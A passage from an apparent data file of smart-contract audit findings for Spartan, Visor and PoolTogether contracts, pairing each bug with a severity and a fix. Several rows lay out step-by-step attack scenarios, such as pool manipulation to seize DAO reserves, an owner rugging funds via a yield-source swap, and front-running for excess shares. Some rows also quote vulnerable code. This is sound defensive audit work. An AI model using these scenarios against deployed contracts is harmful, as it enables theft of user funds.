A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.

Recommend validating the parameters."
20.md,Can accidentally lose tokens when removing liquidity from pool 2,low,"The `Pool.removeLiquiditySingle` function redeems liquidity tokens for underlying to the router contract in case of the `token` being the zero address.
This works if the underlying token is actually `WBNB` but if the pool token is different and the user accidentally inserted `0` as the `token` address, it tries to swap a zero-balance WBNB to `BASE` and the redeemed tokens are stuck.

If `token == 0` add a check for `pool.token == WBNB` such that it is ensured that the pool's token is actually `WBNB`."
20.md,`calcAsymmetricValueToken` never used,low,"The `Utils.calcAsymmetricValueToken` function is not used. Unused code can hint at programming or architectural errors.

Recommend using it or removing it."
20.md,`memberCount` not accurate,low,"The function `depositForMember` of BondVault.sol adds user to the array `arrayMembers`. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array `arrayMembers`.

This will mean the `memberCount()` doesn't show accurate results. Also `allMembers()` will contain duplicate members

```solidity
// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60
function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){
    if(!mapBondAsset_memberDetails[asset].isMember[member]){
        mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)
        arrayMembers.push(member); // Add user to member array (scope: vault)
        mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)
    }
    ...

// Get the total count of all existing & past BondVault members
function memberCount() external view returns (uint256 count){
    return arrayMembers.length;
}
function allMembers() external view returns (address[] memory _allMembers){
    return arrayMembers;
}
```

Use a construction like this:
```solidity
mapping(address => bool) isMember;
if(!isMember[member]){
        isMember[member] = true;
        arrayMembers.push(member);
}
```"
20.md,check if pool exists in `getPool`,low,"The function `getPool` doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0)
Other functions use the results of `getPool` and do followup actions.

For example `createSynth` checks `isCuratedPool(_pool)` == true; if somehow `isCuratedPool(0)` would set to be true, then further actions could be done.
As far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities.
Additionally the reverts that will occur if the result of `getPool`==0 are perhaps difficult to troubleshoot.

```solidity
//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119
function getPool(address token) public view returns(address pool){
    if(token == address(0)){
        pool = mapToken_Pool[WBNB];   // Handle BNB
    } else {
        pool = mapToken_Pool[token];  // Handle normal token
    }
    return pool;
}

function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){
    require(getPool(token) == address(0)); // Must be a valid token

function createPool(address token) external onlyDAO returns(address pool){
    require(getPool(token) == address(0)); // Must be a valid token
```
```solidity
// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37
function createSynth(address token) external returns(address synth){
    require(getSynth(token) == address(0), ""exists""); // Synth must not already exist
    address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address
    require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, ""!curated""); // Pool must be Curated
```


Recommend In function `getPool` add something like:
```solidity
require  (pool !=0, ""Pool doesn't exist"");
```

Note: the functions `createPoolADD` and `createPool` also have to be changed, to use a different way to verify the pool doesn't exist."
20.md,Utils.sol: Combine Swap Output + Fee Calculation to avoid Rounding Errors + Integer Overflow [Updated],low,"For minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.

For example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.

Functions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.

In addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.

```jsx
function calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {
    uint xAddX = x + X;
    uint rawOutput = FullMath.mulDiv(x, Y, xAddX);
    swapFee = FullMath.mulDiv(rawOutput, x, xAddX);
    output = rawOutput - swapFee;
}

function calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){
    uint _baseAmount = iPOOL(pool).baseAmount();
    uint _tokenAmount = iPOOL(pool).tokenAmount();
    (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount);
}
```

The `FullMath` library is included (and made compatible with sol 0.8+) on the issue page for convenience."
20.md,Dao.sol: Reserve emissions must be turned on for `depositLPs` and bonds,low,"`depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.

Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.

Cache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration."
20.md,Missing zero address check on `BondVault` constructor,low,"This is a low risk vulnerability due to the fact that it is possible to lose funds if the Base address is set to a zero address and someone sends funds to this address. As a rule, there should always be checks to make sure that initialized addresses are never a zero address.

According to Slither analysis documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#exploit-scenario-49), there needs to be a zero address checkpoint when initializing a base address in a contract. In the case for `BondVault`, the constructor initializes a base address. There should be a check to make sure this address is never zero to make sure there is no way to lose funds.

Slither detector:

missing-zero-check:

`BondVault.constructor(address)._base` (contracts/BondVault.sol#37) lacks a zero-check on : `BASE = _base (contracts/BondVault.sol#38)`

------------------------------------------------

See issue page for Slither output from console (JSON format):

**Recommend**:
1. Clone repository for Spartan Smart Contracts
2. Create a python virtual environment with a stable python version
3. Install Slither Analyzer on the python VEM
4. Run Slither against all contracts"
20.md,Can't add BNB with `createPoolADD`,low,"The function `createPoolADD()` supports the input of BNB, which it detects by checking `token == address(0)`
Later it calls `_handleTransferIn(token, ...);` with the original value of token, which can be 0.

However in the function `_handleTransferIn()` in poolFactory.sol there is no provision to transfer BNB (it doesn't check for _token == 0), so it will revert when you try to add BNB.

As a comparison, the function `_handleTransferIn()` of Router.sol does check for _token == address(0) and takes appropriate action.
```solidity
//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45
function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){
...
    address _token = token;
    if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB
        ...
    _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool

function _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){
    if(_amount > 0) {
        uint startBal = iBEP20(_token).balanceOf(_pool);
        iBEP20(_token).transferFrom(msg.sender, _pool, _amount);
        actual = iBEP20(_token).balanceOf(_pool) - (startBal);
    }
}
```
```solidity
//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L197
function _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){
    if(_amount > 0) {
        if(_token == address(0)){
            require((_amount == msg.value));
            (bool success, ) = payable(WBNB).call{value: _amount}(""""); // Wrap BNB
            require(success, ""!send"");
            iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool
            actual = _amount;
        } else {
            uint startBal = iBEP20(_token).balanceOf(_pool); // Get prior TOKEN balance of pool
            iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool
            actual = iBEP20(_token).balanceOf(_pool)-(startBal); // Get received TOKEN amount
        }
    }
}
```

Recommend applying the same function as `_handleTransferIn` of Router.sol to `_handleTransferIn` of poolFactory.sol. Better yet deduplicate the function by moving it to a library/included solidity file. Note:  There is also a  `_handleTransferIn` in Synth.sol which isn't used."
20.md,Possible divide by zero errors in `Utils`,low,"Several functions in `Utils` do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.

See issue page for referenced code:
Recommend checking if the divisors are 0 in the above functions to handle edge cases."
20.md,Purging DAO deployer immediately in a single-step is risky,low,"The DAO deployer is used as the authorized address in the modifier onlyDAO allowing it to set various critical protocol addresses and parameters. The `purgeDeployer()` function is expected to be called by the deployer once the DAO is stable and final. However, a single-step critical action such as this is extremely risky because it may be called accidentally and is irrecoverable from such mistakes.

Scenario 1: The DAO is not yet stable and final. But the deployer, e.g. controlled by an EOA, accidentally triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.

Scenario 2: The DAO is not yet stable and final but the deployer incorrectly assumes it is final and triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.

While a two-step process is generally recommended for critical address changes, a single-step purge/renounce is equally risky if it is controlled by an EOA and is not timelocked.

At a minimum, make sure that (1) deployer is not an EOA but a multisig controlled by mutually independent and trustworthy entities, (2) this function is timelocked.

A better design change would be to let the DAO decide if it considers itself stable/final and let it vote for a proposal that purges the deployer."
20.md,"Calling `synthVault`:_deposit multiple times, will make you loose rewards",low,"Calling `deposit` multiple times will change the `mapMemberSynth_lastTime` to
```solidity
mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime;
```

This is used in [`calcCurrentReward`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L157) to calculate how much the user earned.

Everytime the user calls `_deposit` (via deposit), the `mapMemberSynth_lastTime` will be set to a date in the future, meaning that they will loose all the rewards they accrued. Calling [`deposit`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L90) calls [`_deposit`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L102) without harvesting for the user meaning that they lost those rewards.

Recommend force harvest user rewards at the beginning of every `_deposit()`"
20.md,Attacker can trigger pool sync leading to user fund loss,low,"An attacker can front-run any operation that depends on the pool contract's internal balance amounts being unsynced to pool's balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make `_getAddedBaseAmount()` and `_getAddedTokenAmount()` return 0 (because the balances are synced) from such operations.

The affected operations are: `addForMember()`, `swapTo()` and `mintSynth()` which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.

Recommend adding access control to `sync()` function so that only Router can call it via `addDividend()`."
20.md,Vote weight can be manipulated,low,"The vote weight is determined by the `DAOVault` and `BondVault` weight (`voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)`).
The weight in these vaults is the deposited LP token.
The `BondVault` however pays for the `BASE` part itself (see `DAO.handleTransferIn`), therefore one only needs to deposit `tokens` and the `DAO` matches the **swap value**.

Therefore, it's possible to manipulate the pool, deposit only a small amount of `tokens` (receiving a large amount of matching `BASE` by the DAO) and receive a large amount of LP tokens this way.
 attack can be profitable:

1. Manipulate the pool spot price by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price.
2. Repeatedly call `DAO.bond(amount)` to drip `tokens` into the `DAO` and get matched with `BASE` tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the LP minting is relative to the manipulated low `token` reserve, a lot of LP units are minted for a low amount of `tokens`, leading to receiving large weight.
3. Create a proposal to send the entire reserve balance to yourself by using `grantFunds`
4. Unmanipulate the pool by sending back the `tokens` from 1. This might incur a loss.

The cost of the attack is the swap fees from the manipulation of 1. and 4. plus the (small due to manipulation) amount of tokens required to send in 2.
The profit can be the entire reserve amount which is unrelated to the pools (plus reclaiming lots of LP units over the span of the `BondVault` era).
The attack can be profitable under certain circumstances of:
- high reserves
- low liquidity in the pool

I don't think the attack would be feasible if we couldn't get the `DAO` to commit the lion's share of the `BASE` required to acquire LP units through the `BondVault` incentives."
10.md,A previously timelocked NFT token becomes permanently stuck in vault if it’s ever moved back into the vault,high,"Let’s consider a scenario where a particular NFT token was timelocked for a certain duration by the owner using `timeLockERC721()` with a delegate as the recipient and then transferred out of the vault by the delegate via `transferERC721()` but without unlocking it explicitly using `timeUnlockERC721()`.

This is possible because `transferERC721()` does all the timelock checks on `expires/block.timestamp` and `recipient/msg.sender` as is done in `timeUnlockERC721()`. But it misses deleting `timelockERC721s[key]` for that NFT `tokenID` (as done in L572 of `timeUnlockERC721()`).

Because of this missing deletion, if that same NFT is ever put back into the vault later but this time without a timelock, the vault logic still thinks it is a timelocked NFT with the older/stale recipient from earlier because of the missing deletion. So now the owner who makes the `transferERC721()` call will not match the older/stale recipient address and will fail the check on L510 (unless they control that stale recipient address from the earlier timelock).

The impact is that, without access/control to the earlier timelock recipient, this NFT token is now locked in the vault forever.

1. Alice time locks a particular NFT token with delegate Eve as recipient using `timeLockERC721()`
2. Eve transfers NFT to Bob using `transferERC721()` but without calling `timeUnlockERC721()` first
3. Alice buys the same NFT back from Bob (e.g. because it is now considered rare and more valuable) and again puts it back in her vault but this time without locking/delegating it to any recipient i.e. intending to control it herself.
4. Because this NFT's timelock data and delegate approval for Eve is never removed after Step 2, the NFT is still treated as timelocked in the vault with previous delegate Eve as the recipient (because of stale data in `timelockERC721s` and `nftApprovals`)
5. Alice now cannot withdraw her own NFT without Eve’s help because the check on L510 will only allow Eve to transfer this NFT out of the vault.
6. If Eve is no longer trusted/accessible then the NFT is locked in the vault forever.

Recommend adding `delete timelockERC721s [timelockERC721Keys[nftContract][i]];` after L510."
10.md,NFT transfer approvals are not removed and cannot be revoked thus leading to loss of NFT tokens,high,"NFT transfer approvals that are set to true in `approveTransferERC721()` are never set to false and there is no way to remove such an nft approval.

**Impact 1**: The approval is not removed (set to false) after a transfer in `transferERC721()`. So if the NFT is ever moved back into the owner's vault again, then the previous/compromised delegate can again transfer it to any address of choice without requiring a new approval.

**Impact 2**: If a delegate becomes compromised/untrustworthy after granting approval but before transfer then the owner will lose its NFT because there is no mechanism to revoke the approval that was granted earlier.

[PoC-1](https://github.com/code-423n4/2021-05-visorfinance/blob/e0f15162a017130aa66910d46c70ee074b64dd40/contracts/contracts/visor/Visor.sol#L477-L487):
* Alice grants Eve approval to transfer a particular NFT out of its vault using `approveTransferERC721()`
* Eve, who has transfer rights to that NFT from Alice’s vault,  transfers that NFT to Bob using `transferERC721()`
* Alice decides to buy back that NFT (e.g. because it is now considered rare and more valuable) from Bob and transfers it back to its vault
* Eve, who continues to have transfer rights to that NFT from Alice’s vault, can steal that NFT and transfer to anyone

[PoC-2](https://github.com/code-423n4/2021-05-visorfinance/blob/e0f15162a017130aa66910d46c70ee074b64dd40/contracts/contracts/visor/Visor.sol#L489-L522):
* Alice grants Eve approval to transfer a particular NFT out of its vault using `approveTransferERC721()`
* Alice learns that Eve’s keys are compromises or that Eve is malicious and wants to revoke the approval but there is no mechanism to do so
* Eve (or whoever stole her credentials) has transfer rights to that NFT from Alice’s vault and can steal that NFT and transfer to anyone

Recommend adding a boolean parameter to `approveTransferERC721()` and set the `nftApprovals`  to that parameter which can be true for giving approval and false for removing/revoking approval
If ```msg.sender != _getOwner()```, call `approveTransferERC721()` with the boolean false to remove approval before making a transfer in `transferERC721()` on L515."
10.md,Approval for NFT transfers is not removed after transfer,high,"The `Visor.transferERC721` does not reset the approval for the NFT.

An approved delegatee can move the NFT out of the contract once.
It could be moved to a market and bought by someone else who then deposits it again to the same vault.
The first delegatee can steal the NFT and move it out of the contract a second time.

Recommend resetting the approval on transfer."
10.md,Unbounded loop in `_removeNft` could lead to a griefing/DOS attack,high,"Griefing/DOS attack is possible when a malicious NFT contract sends many NFTs to the vault, which could cause excessive gas consumed and even transactions reverted when other users are trying to unlock or transfer NFTs.

The function `_removeNft` uses an unbounded loop, which iterates the array nfts until a specific one is found. If the NFT to be removed is at the very end of the nfts array, this function could consume a large amount of gas.
The function `onERC721Received` is permission-less. The vault accepts any NFTs from any NFT contract and pushes the received NFT into the array nfts.
A malicious user could write an NFT contract, which calls `onERC721Received` of the vault many times to make the array nfts grow to a large size. Besides, the malicious NFT contract reverts when anyone tries to transfer (e.g., `safeTransferFrom`) its NFT.
The vault then has no way to remove the transferred NFT from the malicious NFT contract. The two only functions to remove NFTs, `transferERC721` and `timeUnlockERC721`, fail since the malicious NFT contract reverts all `safeTransferFrom` calls.
As a result, benign users who unlock or transfer NFTs would suffer from large and unnecessary gas consumption. The consumed gas could even exceed the block gas limit and cause the transaction to fail every time.

Recommend using a mapping (e.g., `mapping(address=>Nft[]) nfts`) to store the received NFTs into separate arrays according to `nftContract` instead of putting them into the same one. Or, add a method specifically for the owner to remove NFTs from the nfts array directly."
10.md,Unhandled return value of `transferFrom` in `timeLockERC20()` could lead to fund loss for recipients,medium,"ERC20 implementations are not always consistent. Some implementations of `transfer` and `transferFrom` could return ‘false’ on failure instead of reverting. It is safer to wrap such calls into `require()` statements or use safe wrapper functions implementing return value/data checks to handle these failures. For reference, see similar Medium-severity finding from [Consensys Diligence Audit of Aave Protocol V2](https://consensys.net/diligence/audits/2020/09/aave-protocol-v2/#unhandled-return-values-of-transfer-and-transferfrom).

While the contract uses Uniswap’s `TransferHelper` library function `safeTransfer` in other places for ERC20 tokens, or OpenZeppelin’s `saferTransferFrom` for ERC721 tokens (both of which call the token’s `transfer`/`transferFrom` functions and check return value for success and return data), it misses using `TransferHelper.safeTransferFrom` in this one case on L610 in `timeLockERC20()` when tokens are transferred from owner to the vault and instead directly uses the token’s `transferFrom()` call without checking for its return value.

The impact can be that for an arbitrary ERC20 token, this `transferFrom()` call may return failure but the vault logic misses that, assumes it was successfully transferred into the vault and updates the `timelockERC20Balances` accounting accordingly. The `timeUnlockERC20()`, `transferERC20()` or `delegatedTransferERC20()` calls for that token will fail because the vault contract balance would have less tokens than accounted for in `timelockERC20Balances` because of the previously failed (but ignored) `transferFrom()` call.

1. Let’s say Alice owes Bob 100 USD after a week, for which they agree that Alice will pay in 100 tokens of USD stablecoin tokenA.
2. Alice, the vault owner, calls `timeLockERC20()` for recipient=Bob, token=tokenA, amount=100 and expiry=1-week-from-then (corresponding Unix timestamp) but tokenA’s implementation does not revert on failure but instead returns true/false. If the `transferFrom` failed, say because Alice did not have those 100 tokenAs, the return value is ignored on L610 in `timeLockERC20()` and vault logic considers that it indeed has 100 tokenAs locked for Bob.
3. Bob looks at the `TimeLockERC20` event emitted in the successful `timeLockERC20()` transaction from Alice and assumes 100 tokenAs are indeed locked by Alice in the vault for him which can be withdrawn after expiry.
4. After timelock expiry, Bob tries to transfer the 100 tokenAs Alice locked in the vault for him. The `TransferHelper`.`safeTransfer()` call on L637 in `timeUnlockERC20()` fails because the vault has 0 tokenAs because they were never successfully transferred in Step 2.
5. Bob could thus be tricked into thinking that 100 tokenAs are locked in the vault for him by Alice but they never were. This leads to loss of funds for Bob.

Recommend replacing use of
```solidity
IERC20(token).transferFrom(msg.sender, address(this), amount);
```
with
```solidity
TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);
```
This will revert on transfer failure for e.g. if `msg.sender` does not have a token balance >= amount."
10.md,`transferERC721` doesn't clean `timelockERC721s`,medium,"The function `transferERC721` works similar to the functions `timeUnlockERC721` with timelocked NFT's.
However `timeUnlockERC721` cleans `timelockERC721s` (delete `timelockERC721s[key]`;), while `transferERC721` doesn't clean `timelockERC721s`

This could mean that timelock keys could be used later on (when the NFT would have been transferred to the contract on a later moment in time). Also, the administration doesn't correspond to the available NFT's. Additionally doing a delete gives backs some gas (at least for now).

See [Issue #19](https://github.com/code-423n4/2021-05-visorfinance-findings/issues/19) for code referenced in proof of concept

Recommend checking if the `timelockERC721s` mapping should also be cleaned from `transferERC721`, if so adapt the code accordingly."
10.md,`timelockERC721Keys` could exceed the block size limit,medium,"On line 504 of `Visor.sol`, looping through the `timelockERC721Keys` could exceed the block size limit

Recommend transfer by index instead of token ID"
10.md,sandwich `approveTransferERC20`,low,"Function `approveTransferERC20` is vulnerable to the sandwich attack. Similar to the ERC20 approve issue described [here](https://blog.smartdec.net/erc20-approve-issue-in-simple-words-a41aaf47bca6). A malicious delegate can scout for a `approveTransferERC20` change and sandwich that (`delegatedTransferERC20` amount A, `approveTransferERC20` amount A->B, `delegatedTransferERC20` amount B). It is more of a theoretical issue and mostly depends on the honesty of the delegators. If we can assume that delegators are trustable actors, then this is very unlikely to happen.

Possible mitigation could be to replace `approveTransferERC20` with increasing/decreasing functions."
10.md,Wrong `TimeLockERC20` event emitted,low,"The `Visor.timeLockERC721` function emits the `TimeLockERC20` event but should emit `TimeLockERC721` instead.

It allows tricking the backend into registering ERC20 token transfers that never happened which could lead to serious issues when something like an accounting app uses this data.

Recommend emitting the correct event."
10.md,Timelock keys are never removed after unlocks,low,"`timelockERC20Keys` and `timelockERC721Keys` are used to keep track of number of timelocks for ERC20 and ERC721 tokens. While `timelockERC20()` and `timelockERC721()` functions update these data structures to add the new timelocks, the corresponding unlock functions do not remove the expired timelocks.

This results in their getter functions `getTimeLockCount()` and `getTimeLockERC721Count()` returning the number of all timelocks ever held instead of the expected number of timelocks that are currently active.

Let’s say 5 timelocks are created for a specific ERC20 token of which 3 have been unlocked after expiry. The getter function `getTimeLockCount()` incorrectly reports 5 instead of 2.

Recommend removing unlocked keys from `timelockERC20Keys` and `timelockERC721Keys` in `timeUnlockERC20()` and `timeUnlockERC721()` functions."
10.md,"The function `onERC721Received()` allows writing duplicates in the array ""nfts"". Another functions dealing with this array do not expect duplicates met.",low,"Duplicates can be written accidentally. `If_removeNft()` function is running, it will break when meeting the first match, not trying to remove other duplicates. Thus a caller should call removing a few times.

```solidity
function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata) external override returns (bytes4) {
      _addNft(msg.sender, tokenId);

function _addNft(address nftContract, uint256 tokenId) internal {
    nfts.push(
    Nft({
        tokenId: tokenId,
        nftContract: nftContract
    })
    );
```

Recommend that `In _addNft()` to check if an inputted nft is existing in the ""nfts"" array. Do not push inputted nft if already added."
10.md,`delegatedTransferERC20` can revert when called by owner,low,"If the function `delegatedTransferERC20` is called from the owner  (e.g. msg.sender == _getOwner ) then
```erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))]``` doesn't have to set, so it can have the value of 0.

If you then subtract the amount, you will get an error and the code will revert:
```solidity
erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))] = erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))].sub(amount);
```

A workaround would be to call `approveTransferERC20` also for the owner.

```solidity
function delegatedTransferERC20(address token,address to,uint256 amount) external {
    if(msg.sender != _getOwner()) {
        require(erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))] >= amount,""Account not approved to transfer amount"");
    }
    // check for sufficient balance
    require(IERC20(token).balanceOf(address(this)) >= (getBalanceLocked(token).add(amount)).add(timelockERC20Balances[token]),""UniversalVault: insufficient balance"");

    erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))] = erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))].sub(amount);

    // perform transfer
    TransferHelper.safeTransfer(token, to, amount);
}
```

Recommend also adding `if(msg.sender != _getOwner())` before
```solidity
   erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))] = erc20Approvals[keccak256(abi.encodePacked(msg.sender, token))].sub(amount);
```"
10.md,Locking the same funds twice in `lock()` on line 269 of `Visor.sol`,low,"Two different addresses (Alice and Bob) could get credit for locking up the same funds because a user is able to lock without depositing.

Recommend implementing additional checks to force users to have deposited before they are able to lock tokens"
10.md,Deflationary tokens are not considered in time-locked ERC20 functions,low,"The functions `timeLockERC20` and `timeUnlockERC20` do not consider deflationary tokens, which burn a percentage of the transferred amount during transfers. In that case, time-locked deflationary ERC20 tokens cannot be unlocked (by `timeUnlockERC20`) nor transferred out of the vault (by `transferERC20`), since the transferred amount exceeds the vault's balance.

Recommend that in function `timeLockERC20`, after the function `transferFrom`, the vault should get the actual received amount by `token.balanceOf(address(this)).sub(tokenAmountBeforeTransfer)`."
10.md,"missing condition in `addTemplate(bytes32 name, address template)`, `visorFactory.sol`",low,"In `require()` of function `addTemplate(bytes32 name, address template)`, we check if a given name has been allotted or not. But, it misses checking the second parameter of function that is template. Without checking template address, an unintended address can be set for given name.

Recommend adding one more condition in `require()` for checking of template address."
24.md,"`onlyOwnerOrAssetManager` can swap Yield Source in `SwappableYieldSource` at any time, immediately rugging all funds from old yield source",high,"The function `swapYieldSource` [SwappableYieldSource.sol` L307](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L307)

Can be called by the owner (deployer / initializer) or Asset Manager. The function will take all funds from the old Yield Source, and transfer them to the new Yield source. Any contract that implement the function `function depositToken() external returns (address)` will pass the check

However, if either the owner or the `assetManager` have malicious intent, this function allows them to instantly rug all funds

1) Create a contract that implements the `function depositToken() external returns (address)`
2) Be the Owner or `AssetManager`
3) Call `setYieldSource` while pointing at your malicious contract
4) Profit

I highly recommend checking that the `YieldSource` is from a trusted registry before allowing this swap.

Alternatively forcing each `Owner` to be a `TimeLock` with at least 48 hours may provide enough security to allow this to be used in practice"
24.md,`redeemToken` can fail for certain tokens,high,"The `SwappableYieldSource.redeemToken` function transfers tokens from the contract back to the sender, however, it uses the `ERC20.transferFrom(address(this), msg.sender, redeemableBalance)` function for this.
Some deposit token implementations might fail as `transferFrom` checks if the contract approved itself for the `redeemableBalance` instead of skipping the allowance check in case the sender is the `from` address.

This can make the transaction revert and the deposited funds will be unrecoverable for the user.

It's recommended to use `_depositToken.safeTransfer(msg.sender, redeemableBalance)` instead."
24.md,`setYieldSource` leads to temporary wrong results,high,"The use of `setYieldSource` leaves the contract in a temporary inconsistent state because it changes the underlying yield source,
but doesn't (yet) transfer the underlying balances, while the shares stay the same.

The function `balanceOfToken` will show the wrong results, because it is based on `_sharesToToken`, which uses `yieldSource.balanceOfToken(address(this))`, that isn't updated yet.

More importantly `supplyTokenTo` will give the wrong amount of shares back:
First it supplies tokens to the `yieldsource`.
Then is calls `_mintShares`, which calls `_tokenToShares`, which calculates the shares, using `yieldSource.balanceOfToken(address(this))`
This `yieldSource.balanceOfToken(address(this))` only contains the just supplied tokens, but doesn't include the tokens from the previous `YieldSource`.
So the wrong amount of shares is given back to the user; they will be given more shares than appropriate which means they can drain funds later on (once `transferFunds` has been done).

It is possible to make use of this problem in the following way:
- monitor the blockchain until you see `setYieldSource` has been done
- immediately call the function `supplyTokenTo` (which can be called because there is no access control on this function)

```solidity
// https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol
function setYieldSource(IYieldSource _newYieldSource) external `onlyOwnerOrAssetManager` returns (bool) {
  _setYieldSource(_newYieldSource);

function _setYieldSource(IYieldSource _newYieldSource) internal {
..
    yieldSource = _newYieldSource;

 function supplyTokenTo(uint256 amount, address to) external override nonReentrant {
   ..
    yieldSource.supplyTokenTo(amount, address(this));
    _mintShares(amount, to);
  }

 function _mintShares(uint256 mintAmount, address to) internal {
    uint256 shares = `_tokenToShares`(mintAmount);
    require(shares > 0, ""SwappableYieldSource/shares-gt-zero"");
    _mint(to, shares);
  }

 function _tokenToShares(uint256 tokens) internal returns (uint256) {
    uint256 shares;
    uint256 _totalSupply = totalSupply();
..
      uint256 exchangeMantissa = FixedPoint.calculateMantissa(_totalSupply, yieldSource.balanceOfToken(address(this))); // based on incomplete yieldSource.balanceOfToken(address(this))
      shares = FixedPoint.multiplyUintByMantissa(tokens, exchangeMantissa);


function balanceOfToken(address addr) external override returns (uint256) {
    return _sharesToToken(balanceOf(addr));
  }

 function _sharesToToken(uint256 shares) internal returns (uint256) {
    uint256 tokens;
    uint256 _totalSupply = totalSupply();
..
      uint256 exchangeMantissa = FixedPoint.calculateMantissa(yieldSource.balanceOfToken(address(this)), _totalSupply); // based on incomplete yieldSource.balanceOfToken(address(this))
      tokens = FixedPoint.multiplyUintByMantissa(shares, exchangeMantissa);
```

Reocommend removing the function `setYieldSource`  (e.g. only leave `swapYieldSource`)
Or temporally disable actions like `supplyTokenTo`, `redeemToken` and balanceOfToken, after `setYieldSource` and until `transferFunds` has been done."
24.md,`SwappableYieldSource`: Missing same deposit token check in `transferFunds()`,high,"`transferFunds()` will transfer funds from a specified yield source `_yieldSource` to the current yield source set in the contract `_currentYieldSource`. However, it fails to check that the deposit tokens are the same. If the specified yield source's assets are of a higher valuation, then a malicious owner or asset manager will be able to exploit and pocket the difference.

Assumptions:
- `_yieldSource` has a deposit token of WETH (18 decimals)
- `_currentYieldSource` has a deposit token of DAI (18 decimals)
- 1 WETH > 1 DAI (definitely true, I'd be really sad otherwise)

Attacker does the following:
1. Deposit 100 DAI into the swappable yield source contract
2. Call `transferFunds(_yieldSource, 100 * 1e18)`
    - `_requireDifferentYieldSource()` passes
    - `_transferFunds(_yieldSource, 100 * 1e18)` is called
        - `_yieldSource.redeemToken(_amount);` → This will transfer 100 WETH out of the `_yieldSource` into the contract
        - `uint256 currentBalance = IERC20Upgradeable(_yieldSource.depositToken()).balanceOf(address(this));` → This will equate to ≥ 100 WETH.
        - `require(_amount <= currentBalance, ""SwappableYieldSource/transfer-amount-different"");` is true since both are `100 * 1e18`
